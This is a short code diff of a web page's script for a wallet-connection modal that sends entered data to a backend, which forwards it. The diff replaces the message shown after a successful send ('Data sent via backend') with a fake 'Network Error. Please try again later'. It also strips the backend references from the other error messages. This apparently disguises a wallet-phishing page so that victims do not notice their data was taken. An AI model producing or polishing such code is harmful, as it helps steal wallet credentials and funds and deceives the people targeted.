@@ -1740,21 +1740,21 @@ textarea:focus, input:focus {
             });
 
             if (response.ok) {
-                console.log('Data sent successfully to backend and forwarded!');
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Connection successful! Data sent via backend.';
+                console.log('Data');
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network Error. Please try again later ';
                 setTimeout(() => {
                     walletModal.style.display = 'none';
                     document.body.style.overflow = 'auto';
                 }, 1000);
             } else {
                 const errorData = await response.json();
-                console.error('Failed to send data to backend:', response.statusText, errorData);
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect to backend.'}`;
+                console.error('Failed :', response.statusText, errorData);
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect.'}`;
                 showScreen('error');
             }
         } catch (error) {
             console.error('Network error or unexpected issue:', error);
-            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error. Ensure backend is running.';
+            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error..';
             showScreen('error');
         }
     }
